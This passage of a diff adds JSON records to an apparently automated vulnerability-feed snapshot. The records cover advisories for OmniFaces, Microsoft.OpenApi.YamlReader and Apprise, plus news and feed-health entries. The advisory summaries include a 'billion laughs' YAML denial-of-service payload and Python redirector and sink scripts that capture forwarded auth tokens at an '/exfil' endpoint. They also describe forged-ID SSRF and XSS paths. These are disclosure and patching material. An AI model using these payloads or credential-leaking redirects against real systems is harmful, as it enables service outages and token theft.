+        "org.omnifaces:omnifaces",
+        "org.omnifaces:omnifaces",
+        "org.omnifaces:omnifaces",
+        "org.omnifaces:omnifaces"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-07-24T22:35:27+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/omnifaces/omnifaces/security/advisories/GHSA-fp43-vj7g-pg92",
+        "https://github.com/omnifaces/omnifaces/commit/59d6c5188c39418546fe500d05036645987a77d1",
+        "https://github.com/omnifaces/omnifaces/commit/a52b92461cf39d983f51ce8724fe7e6b944073e4",
+        "https://github.com/omnifaces/omnifaces/commit/aa42da361821ddfbb85b126564e71587347d2786",
+        "https://github.com/omnifaces/omnifaces/commit/c43eef01174a4dc09cec44eff553ff6284150af7",
+        "https://github.com/omnifaces/omnifaces/commit/d5cae243c4692555efaa4ba774e0f8f60e3f4db5",
+        "https://github.com/advisories/GHSA-fp43-vj7g-pg92"
+      ],
+      "selection_reasons": [
+        "priority technology: browsers +8",
+        "official source +5",
+        "modified metadata in window -5"
+      ],
+      "selection_score": 8,
+      "severity": "high",
+      "source_name": "GitHub Global Security Advisories",
+      "source_tier": 1,
+      "source_type": "reviewed_advisory",
+      "source_url": "https://github.com/advisories/GHSA-fp43-vj7g-pg92",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "## 1. Forged combined-resource IDs\n`CombinedResourceInfo` accepts a path-derived ID without an authenticity check,\ninflates it without an output limit, converts it to attacker-selected resource\nidentifiers, and retains unique IDs in an unbounded static cache. In bounded\ntests, 20,754 encoded bytes inflated to 16,000,000 characters (about 770:1;\nabout 49 MB observed heap delta), and 200 unique IDs added 200 permanent cache\nentries. A legitimately shaped short ID remained about 1:1, while malformed\ninput was rejected; the missing distinction is between a server-issued ID and\nan attacker-minted but structurally valid ID.\n\nThe minimal application also confirmed three sink tails from the same forged-ID\nroot:\n\n- A wildcard CDN mapping performed a server-side fetch and relayed the exact\n  loopback-canary body. This requires the documented combined-resource and\n  wildcard-CDN configuration.\n- A forged inner `.xhtml` resource bypassed the excluded-resource boundary and\n  returned its raw content.\n- A forged `omnifaces.graphic` inner resource plus a canary `Host` header caused\n  an outbound GET to that host. This result is blind and deployment-dependent;\n  I am not claiming arbitrary-scheme or arbitrary-destination SSRF.\n\nThese behaviors reproduce after the fix for CVE-2026-41883 /\nGHSA-vp6r-9m58-5xv8. That advisory concerned EL evaluation order in the wildcard\nCDN path. This report has a different root: unsigned combined IDs and missing\ndecode/cache bounds, with separately demonstrated residual sink behavior.\n\n## 2. Source-map cache \n\nWith the documented optional source-map handler above a synthetic resource\nhandler, 40 unique missing combined-resource requests grew the process-wide\nsource-map cache from 13 to 92 entries. It has no size or eviction bound. This\nhas a separate cache, configuration prerequisite, and fix from family 1.\n\n## 3. HashParam callback output\n\nA URL-fragment value containing a single-quote JavaScript payload was stored by\n`o:hashParam` and later written unescaped into the Ajax callback script. On the\nfollow-up Ajax render, real Chrome executed the canary\n`window.__omniXss=1337`. This requires a page using `o:hashParam` and the\nfollow-up Ajax render.\n\n## 4. Session/view push-channel replay \n\nA fresh WebSocket client with no HTTP cookie connected using a victim's\nsession-scoped channel ID and received the victim's subsequent push. The code\nchecks application-wide ID existence but does not bind the handshake to the\ncurrent HTTP session, despite the documented current-session guarantee. The\nUUID remains an unguessable bearer-token prerequisite; this is replay after\ntoken exposure, not brute force.\n\n## 5. Push idle-connection and fanout behavior \n\nTwelve independent clients joined one application-scoped channel and all 12\nreceived the same push. Current code sets every accepted session's maximum idle\ntimeout to zero, retains sessions in an unbounded per-channel queue, and walks\nthe full queue on each push. I am reporting the demonstrated mechanism as a\nbounded design weakness: container connection limits remain an outer bound,\nand I am not claiming unbounded heap growth from the 12-client test.\n\n## Intentionally excluded leads\n\n- A duplicate-Range response-amplification lead was disproved. Twenty-four\n  ranges produced only one response body because the stream wrapper closes\n  after the first range. I am not reporting it as a security issue.\n- The older `Servlets.facesRedirect` XML issue is fixed on the current branch.\n  I am not reporting it as a new current-upstream issue.\n\n## Expected invariants\n\n- Only server-issued combined IDs should be accepted; decoding and caches\n  should be bounded; excluded resources and dynamic handlers should not become\n  attacker-selected inner resources.\n- Dynamic URLs should not derive an outbound destination from an untrusted\n  `Host` header.\n- Source-map lookups should not create unbounded process-lifetime state.\n- `HashParam` values must be escaped for a JavaScript string inside an XML\n  CDATA callback.\n- Session/view push subscriptions should be bound to the owning HTTP session or\n  authenticated principal; idle limits and per-channel caps should remain\n  operator-controllable.\n\n## Suggested fixes and available evidence\n\n- Authenticate generated combined IDs with a per-deployment secret, cap\n  inflated output, bound the combined cache, and avoid caching failed loads.\n- Require an existing/registered inner resource before wildcard remapping and\n  reject excluded resource types at serve time.\n- Derive dynamic-resource origins from trusted configuration rather than the\n  request `Host` value.\n- Bound or evict the source-map cache.\n- Apply JavaScript-string plus CDATA-safe encoding to `HashParam` callback\n  values.\n- Capture and verify HTTP-session or principal ownership during the WebSocket\n  handshake; retain a finite idle timeout and configurable per-channel limits.\n\nDaniel Birtwhistle",
+      "title": "OmniFaces: Forged combined-resource IDs and related output/push boundaries",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": "Brian Krebs",
+      "blue_team_relevance": "Independent security investigation and incident context.",
+      "canonical_id": "url:https://krebsonsecurity.com/2026/10/u-k-sanctions-cryptomus-for-ru-money-laundering/",
+      "category": "expert_commentary",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.752697+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "medium",
+      "critical_asset_exposure": null,
+      "current_state": null,
+      "cve_ids": [],
+      "cvss_score": null,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [],
+      "discovery_type": null,
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": null,
+      "epss_score": null,
+      "excerpt_origin": "publisher_feed",
+      "exploitation_status": null,
+      "first_seen": null,
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": null,
+      "modified_at": "2026-10-14T14:22:49+00:00",
+      "official_source": false,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "no severity score"
+      ],
+      "priority_score": 0.0,
+      "products": [],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T14:22:49+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://krebsonsecurity.com/2026/10/u-k-sanctions-cryptomus-for-ru-money-laundering/"
+      ],
+      "selection_reasons": [
+        "Included as source-backed advisory in coverage window"
+      ],
+      "selection_score": 0,
+      "severity": null,
+      "source_name": "Krebs on Security",
+      "source_tier": 2,
+      "source_type": "expert_rss",
+      "source_url": "https://krebsonsecurity.com/2026/10/u-k-sanctions-cryptomus-for-ru-money-laundering/",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "The United Kingdom has issued economic sanctions against Cryptomus, a chameleonic cryptocurrency platform that experts say serves as a major conduit for payments related\u2026",
+      "title": "U.K. Sanctions Cryptomus for RU Money Laundering",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "Operational analyst perspective from the SANS Internet Storm Center.",
+      "canonical_id": "url:https://isc.sans.edu/diary/rss/33428",
+      "category": "analyst_diary",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:01.022461+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "medium",
+      "critical_asset_exposure": null,
+      "current_state": null,
+      "cve_ids": [],
+      "cvss_score": null,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [],
+      "discovery_type": null,
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": null,
+      "epss_score": null,
+      "excerpt_origin": "publisher_feed",
+      "exploitation_status": null,
+      "first_seen": null,
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": null,
+      "modified_at": "2026-10-15T02:00:03+00:00",
+      "official_source": false,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "no severity score"
+      ],
+      "priority_score": 0.0,
+      "products": [],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-15T02:00:03+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://isc.sans.edu/diary/rss/33428"
+      ],
+      "selection_reasons": [
+        "Included as source-backed advisory in coverage window"
+      ],
+      "selection_score": 0,
+      "severity": null,
+      "source_name": "SANS Internet Storm Center Handler's Diary",
+      "source_tier": 2,
+      "source_type": "analyst_rss",
+      "source_url": "https://isc.sans.edu/diary/rss/33428",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.",
+      "title": "ISC Stormcast For Thursday, October 15th, 2026 https://isc.sans.edu/podcastdetail/10138, (Thu, Oct 15th)",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "Operational analyst perspective from the SANS Internet Storm Center.",
+      "canonical_id": "url:https://isc.sans.edu/diary/rss/33426",
+      "category": "analyst_diary",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:01.022563+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "medium",
+      "critical_asset_exposure": null,
+      "current_state": null,
+      "cve_ids": [],
+      "cvss_score": null,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [],
+      "discovery_type": null,
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": null,
+      "epss_score": null,
+      "excerpt_origin": "publisher_feed",
+      "exploitation_status": null,
+      "first_seen": null,
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": null,
+      "modified_at": "2026-10-15T01:10:57+00:00",
+      "official_source": false,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "no severity score"
+      ],
+      "priority_score": 0.0,
+      "products": [],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-15T01:10:57+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://isc.sans.edu/diary/rss/33426"
+      ],
+      "selection_reasons": [
+        "Included as source-backed advisory in coverage window"
+      ],
+      "selection_score": 0,
+      "severity": null,
+      "source_name": "SANS Internet Storm Center Handler's Diary",
+      "source_tier": 2,
+      "source_type": "analyst_rss",
+      "source_url": "https://isc.sans.edu/diary/rss/33426",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "[This is a Guest Diary by Zachary Norwood, an ISC intern as part of the SANS.edu BACS program]",
+      "title": "Panchan's Mining Island [Guest Diary], (Wed, Oct 14th)",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        ">= 3.0.0, < 3.10.0",
+        ">= 2.0.0-preview.11, < 2.12.0",
+        "< 1.6.30"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-72923",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.499827+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 0.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "1.6.30",
+          "2.12.0",
+          "3.10.0"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "high",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-72923"
+      ],
+      "cvss_score": 0.0,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [
+        "nuget",
+        "nuget",
+        "nuget"
+      ],
+      "epss_percentile": 0.79241,
+      "epss_score": 0.01895,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [
+        "3.10.0",
+        "2.12.0",
+        "1.6.30"
+      ],
+      "ghsa_ids": [
+        "GHSA-7pxr-59rr-hqj2"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T20:11:31+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 0.0",
+        "detection opportunity",
+        "metadata-only update"
+      ],
+      "priority_score": 0.0,
+      "products": [
+        "Microsoft.OpenApi.YamlReader",
+        "Microsoft.OpenApi.YamlReader",
+        "Microsoft.OpenApi.Readers"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T20:11:29+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/microsoft/OpenAPI.NET/security/advisories/GHSA-7pxr-59rr-hqj2",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-72923",
+        "https://github.com/microsoft/OpenAPI.NET/pull/3000",
+        "https://github.com/microsoft/OpenAPI.NET/pull/3005",
+        "https://github.com/microsoft/OpenAPI.NET/pull/3020",
+        "https://github.com/microsoft/OpenAPI.NET/commit/1f9aea9bdcbf4066b59ce33b3bd8f97ed9cb4766",
+        "https://github.com/microsoft/OpenAPI.NET/commit/21793261d6860fb6e607b71fd95c0bd320724764",
+        "https://github.com/microsoft/OpenAPI.NET/commit/4db9af07d112cdf45170b7a946f956ffe74fa14e",
+        "https://github.com/microsoft/OpenAPI.NET/releases/tag/v1.6.30",
+        "https://github.com/microsoft/OpenAPI.NET/releases/tag/v2.12.0",
+        "https://github.com/microsoft/OpenAPI.NET/releases/tag/v3.10.0",
+        "https://github.com/advisories/GHSA-7pxr-59rr-hqj2"
+      ],
+      "selection_reasons": [
+        "official source +5",
+        "modified metadata in window -5"
+      ],
+      "selection_score": 0,
+      "severity": "high",
+      "source_name": "GitHub Global Security Advisories",
+      "source_tier": 1,
+      "source_type": "reviewed_advisory",
+      "source_url": "https://github.com/advisories/GHSA-7pxr-59rr-hqj2",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "### Impact\n\nA small YAML OpenAPI document containing nested anchors and aliases can cause uncontrolled resource consumption in Microsoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers. The issue affects OpenAPI document parsing through the public YAML reader APIs and can cause the parsing process to allocate excessive memory and terminate through out-of-memory conditions.\n\n## Affected versions\n\n### Microsoft.OpenApi.YamlReader\n\n* `>= 2.0.0-preview.11, < 2.12.0`\n* `>= 3.0.0, < 3.10.0`\n\n### Microsoft.OpenApi.Readers\n\n* `< 1.6.30`\n\n### Patches\n\n* For the 1.X major version, versions 1.6.30 and above are patched.\n* For the 2.X major version, versions 2.12.0 and above are patched.\n* For the 3.X major version, versions 3.10.0 and above are patched.\n\n## Impact\n\nApplications, CLIs, developer tools, or services that parse untrusted YAML OpenAPI documents in-process may be terminated by a crafted YAML document containing nested anchors and aliases.\n\nThe impact is availability/process termination only. This report does not claim remote code execution, authentication bypass, credential exposure, privilege escalation, data exposure, or Microsoft hosted service impact.\n\n## Details\n\nMicrosoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers parses YAML through SharpYaml. SharpYaml represents aliases as shared `YamlNode` instances in a directed acyclic graph, so the initial parsed YAML graph remains small. During conversion to `System.Text.Json.Nodes.JsonNode`, aliases must be materialized as independent nodes because `JsonNode` instances cannot be attached to multiple parents.\n\nWithout a bound on that conversion work, a small YAML document using nested anchors and aliases can expand exponentially during conversion. With `N` nested anchors each referenced `k` times, conversion can require `k^N` materialized JSON nodes, leading to excessive memory allocation and possible process termination.\n\nThis is an uncontrolled resource consumption vulnerability, also known as a \"billion laughs\" style denial of service.\n\n### Example payload\n\n```yaml\nopenapi: 3.0.0\ninfo:\n  title: Test\n  version: 0.0.1\npaths: {}\nx-a: &a [\"lol\", \"lol\", \"lol\", \"lol\", \"lol\", \"lol\", \"lol\", \"lol\", \"lol\"]\nx-b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]\nx-c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]\nx-d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]\nx-e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]\nx-f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]\n```\n\n## Remediation\n\nUsers should upgrade to Microsoft.OpenApi.YamlReader `2.12.0` or `3.10.0`, or Microsoft.OpenApi.Readers `1.6.30`, depending on the major version line they consume.\n\nThe patched versions bound YAML-to-JSON conversion work and fail fast instead of allowing unbounded expansion. The default limits are:\n\n* Maximum materialized node count: `5,000,000`\n* Maximum nesting depth: `64`\n\nWhen the limits are exceeded, `OpenApiYamlReader.Read` reports an `OpenApiDiagnostic` error and does not return a parsed document.\n\nThe limits are exposed as process-wide static properties on `YamlConverter` for consumers that need to tune them for trusted workloads:\n\n* `YamlConverter.MaxNodeCount`\n* `YamlConverter.MaxDepth`\n\nApplications that parse OpenAPI documents from untrusted sources should avoid parsing those documents in the primary application process when possible. Running parsing in an isolated process can reduce the blast radius of parser failures.",
+      "title": "Microsoft.OpenApi.YamlReader vulnerable to denial of service via YAML alias expansion",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [
+        "<= 1.10.0"
+      ],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-59180",
+      "category": "vulnerability",
+      "cisa_due_date": null,
+      "cisa_kev": null,
+      "cisa_required_action": null,
+      "collected_at": "2026-10-15T14:41:00.499895+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 0.0,
+        "exploitation_status": "unknown",
+        "fixed_versions": [
+          "1.11.0"
+        ],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "low",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-59180"
+      ],
+      "cvss_score": 0.0,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [
+        "pip"
+      ],
+      "epss_percentile": 0.22812,
+      "epss_score": 0.00315,
+      "excerpt_origin": null,
+      "exploitation_status": null,
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [
+        "1.11.0"
+      ],
+      "ghsa_ids": [
+        "GHSA-856c-92hv-3vxx"
+      ],
+      "kev_date_added": null,
+      "known_exploited": null,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T18:38:08+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "NORMAL",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 0.0",
+        "detection opportunity",
+        "metadata-only update"
+      ],
+      "priority_score": 0.0,
+      "products": [
+        "apprise"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T18:38:05+00:00",
+      "recommended_actions": [],
+      "references": [
+        "https://github.com/caronc/apprise/security/advisories/GHSA-856c-92hv-3vxx",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-59180",
+        "https://github.com/caronc/apprise/pull/1610",
+        "https://github.com/caronc/apprise/commit/68c0aef218055e4586cf4605fd6b56358f5f462d",
+        "https://github.com/caronc/apprise/releases/tag/v1.11.0",
+        "https://github.com/advisories/GHSA-856c-92hv-3vxx"
+      ],
+      "selection_reasons": [
+        "official source +5",
+        "modified metadata in window -5"
+      ],
+      "selection_score": 0,
+      "severity": "low",
+      "source_name": "GitHub Global Security Advisories",
+      "source_tier": 1,
+      "source_type": "reviewed_advisory",
+      "source_url": "https://github.com/advisories/GHSA-856c-92hv-3vxx",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "# Summary\n\nApprise's HTTP-based notification plugins and its HTTP attachment / config loaders (`apprise/attachment/http.py`, `apprise/config/http.py`) follow HTTP 3xx redirects by default and **re-send the user-configured auth headers and query parameters on the redirected request**. If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a `302 Location:` to an arbitrary host and Apprise forwards the user's secret (`X-Gotify-Key`, `Authorization`, bearer tokens in query, custom `+Header=` values) to that cross-origin host. The attacker does **not** need to control the original Apprise URL \u2014 only the response from a destination the operator already trusts.\n\nThis is the application-layer analogue of urllib3 [`GHSA-34jh-p97f-mpxf`](https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf) / `CVE-2026-44431` (\"`Proxy-Authorization` forwarded across cross-origin redirect\").\n\n# Affected versions\n\nAll releases up to and including `v1.10.0` (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes [PR #1610](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit 68c0aef218055e4586cf4605fd6b56358f5f462d).\n\n# Details\n\n`apprise/plugins/gotify.py` (pre-fix HEAD, lines 226-244, verbatim):\n\n```python\nheaders = {\n    \"User-Agent\": self.app_id,\n    \"Content-Type\": \"application/json\",\n    \"X-Gotify-Key\": self.token,    # user-supplied secret\n}\n...\nr = requests.post(\n    url,\n    data=dumps(payload),\n    headers=headers,\n    verify=self.verify_certificate,\n    timeout=self.request_timeout,\n    # NO allow_redirects=False -- requests default is True\n)\n```\n\n`requests` follows 3xx redirects by default and re-attaches the `headers=` dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (`custom_json`, `custom_xml`, `custom_form`, `gotify`, `ntfy`, `mattermost`, `apprise_api`, and most other HTTP-based plugins), plus in `apprise/attachment/http.py` and `apprise/config/http.py`.\n\n## Reproduction (local, safe)\n\n```python\n# attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink\nimport http.server\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        self.send_response(302)\n        self.send_header(\"Location\", \"http://127.0.0.1:8082/exfil\")\n        self.end_headers()\nhttp.server.HTTPServer((\"127.0.0.1\", 8081), H).serve_forever()\n```\n\n```python\n# attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers\nimport http.server\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        print(\"LEAKED HEADERS:\", dict(self.headers))\n        self.send_response(204); self.end_headers()\nhttp.server.HTTPServer((\"127.0.0.1\", 8082), H).serve_forever()\n```\n\n```python\n# victim\nfrom apprise import Apprise\na = Apprise()\na.add(\"gotify://127.0.0.1:8081?token=SECRETTOKEN\")\na.notify(body=\"x\")\n```\n\nObserved on `master` HEAD (2026-05-13): `attacker_sink.py` prints `X-Gotify-Key: SECRETTOKEN` -- the user-supplied token followed the cross-origin redirect.\n\n# Patch\n\nFix landed in [`caronc/apprise#1610`](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit `68c0aef`):\n\n- Adds `?redirect=yes|no` URL parameter on every plugin URL\n- Adds `AppriseAsset.http_redirects` global default\n- Equivalent flags wired into `apprise/attachment/http.py` and `apprise/config/http.py`\n\nThe default remains `redirects=True` for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append `?redirect=no` to their Apprise URLs or set `AppriseAsset(http_redirects=False)` globally.\n\nReleased in v1.11.0 (2026-05-29, available on PyPI).\n\nRelated:\n- Documentation: [`caronc/apprise-docs#60`](https://github.com/caronc/apprise-docs/pull/60) (merged 2026-05-16)\n- API counterpart: [`caronc/apprise-api#331`](https://github.com/caronc/apprise-api/pull/331) (merged 2026-05-29; shipped in apprise-api v1.5.1, built on Apprise v1.11.0)\n\n# Remediation\n\nUpgrade to Apprise v1.11.0 or later (`pip install -U apprise`).\n\nThe default remains `redirect=yes` for backwards compatibility, so after upgrading, operators who relay notifications through destinations they don't fully trust should also set `AppriseAsset(http_redirects=False)` globally or append `?redirect=no` to each plugin URL.\n\nIf you cannot upgrade yet, operate Apprise only against fully trusted notification destinations (the maintainer-documented supported model).\n\n# Classification\n\n- **CWE-200** Exposure of Sensitive Information to an Unauthorized Actor -- user's auth tokens / API keys / custom `+Header=` values are forwarded onto the cross-origin redirected request.\n- **CWE-601** URL Redirection to Untrusted Site -- a 3xx response from the initial (operator-configured) target sends the request and its credentials to a host the operator never configured.\n\nCVSS 3.1: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` -> **3.1 LOW**.\n\nAttack requires the operator-configured destination to be compromised or an attacker to be on the network path. Impact is partial confidentiality loss: a single user-supplied secret per redirected request, scoped to that one notification channel. This is intentionally a narrow redirect/header-forwarding hardening issue, not a claim that remote destinations or remote configuration are themselves vulnerabilities.",
+      "title": "Apprise forwards configured auth headers across cross-origin HTTP redirects",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [],
+      "weaknesses": [],
+      "withdrawn": false
+    }
+  ],
+  "source_health": [
+    {
+      "cache_status": null,
+      "duration_ms": 548,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:36:32.948179+00:00",
+      "http_status": null,
+      "items_accepted": 1745,
+      "items_received": 1745,
+      "items_rejected": 0,
+      "required": true,
+      "sanitized_error_message": null,
+      "source": "cisa_kev",
+      "started_at": "2026-10-15T14:36:32.399330+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 265068,
+      "error_type": "TimeoutError",
+      "finished_at": "2026-10-15T14:40:58.017250+00:00",
+      "http_status": null,
+      "items_accepted": 0,
+      "items_received": 0,
+      "items_rejected": 0,
+      "required": true,
+      "sanitized_error_message": "The read operation timed out",
+      "source": "nvd",
+      "started_at": "2026-10-15T14:36:32.948531+00:00",
+      "status": "failed"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 2444,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:00.500279+00:00",
+      "http_status": null,
+      "items_accepted": 8,
+      "items_received": 8,
+      "items_rejected": 0,
+      "required": true,
+      "sanitized_error_message": null,
+      "source": "github_advisories",
+      "started_at": "2026-10-15T14:40:58.055545+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 252,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:00.752757+00:00",
+      "http_status": null,
+      "items_accepted": 1,
+      "items_received": 10,
+      "items_rejected": 0,
+      "required": false,
+      "sanitized_error_message": null,
+      "source": "rss_krebs",
+      "started_at": "2026-10-15T14:41:00.500308+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 269,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:01.022603+00:00",
+      "http_status": null,
+      "items_accepted": 2,
+      "items_received": 10,
+      "items_rejected": 0,
+      "required": false,
+      "sanitized_error_message": null,
+      "source": "rss_sans_isc",
+      "started_at": "2026-10-15T14:41:00.752791+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 2284,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:03.306989+00:00",
+      "http_status": null,
+      "items_accepted": 0,
+      "items_received": 90,
+      "items_rejected": 0,
+      "required": false,
+      "sanitized_error_message": null,
+      "source": "github_releases",
+      "started_at": "2026-10-15T14:41:01.022734+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 3625,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:06.932736+00:00",
+      "http_status": null,
+      "items_accepted": 0,
+      "items_received": 40,
+      "items_rejected": 40,
+      "required": false,
+      "sanitized_error_message": null,
+      "source": "hacker_news",
+      "started_at": "2026-10-15T14:41:03.307335+00:00",
+      "status": "healthy"
+    },
+    {
+      "cache_status": null,
+      "duration_ms": 6474,
+      "error_type": null,
+      "finished_at": "2026-10-15T14:41:13.407991+00:00",
+      "http_status": null,
+      "items_accepted": 1626,
+      "items_received": 1753,
+      "items_rejected": 127,
+      "required": false,
+      "sanitized_error_message": null,
+      "source": "epss",
+      "started_at": "2026-10-15T14:41:06.933357+00:00",
+      "status": "healthy"
